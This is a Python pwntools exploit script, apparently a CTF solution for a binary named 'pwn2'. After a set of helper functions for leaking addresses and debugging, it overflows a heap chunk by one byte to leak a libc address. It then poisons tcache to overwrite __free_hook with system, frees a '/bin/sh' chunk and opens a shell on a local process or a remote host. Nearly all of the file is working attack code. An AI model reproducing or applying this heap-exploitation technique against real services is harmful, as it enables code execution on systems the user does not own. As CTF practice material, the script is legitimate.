# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './pwn2'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def boom( pwn ):
    context.update( os = 'linux', arch = 'amd64',timeout = 1)
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add(size , content = 'a\n'):
    cmd(1)
    sla('size:',size)
    sa('content:' , content)

def edit(idx , content):
    cmd(2)
    sla('idx:', idx)
    sla('content:' , content)

def delete(idx ):
    cmd(3)
    sla('idx:', idx)

def show(idx ):
    cmd(4)
    sla('idx:', idx)
# one_gad = one_gadget(libc.path)

def attack():
    
    add(0x48)
    add(0x410)
    add(0x18) #2
    add(0x18)

    delete(0)
    add(0x48 , 'a'*0x48 + '\x41')
    delete(1)
    add(0x410)

    show(2)

    __malloc_hook = l64() - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()
    lg('__free_hook',__free_hook)

    add(0x18) #4

    delete(4)
    edit(2 , p64(__free_hook - 0x8))

    add(0x18)
    add(0x18 , flat('/bin/sh\x00' , system_addr) + '\n')

    delete(5)
    # dbg()
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   pwn2.py
@Time    :   2022/01/09 12:20:10
@Author  :   Niyah 
'''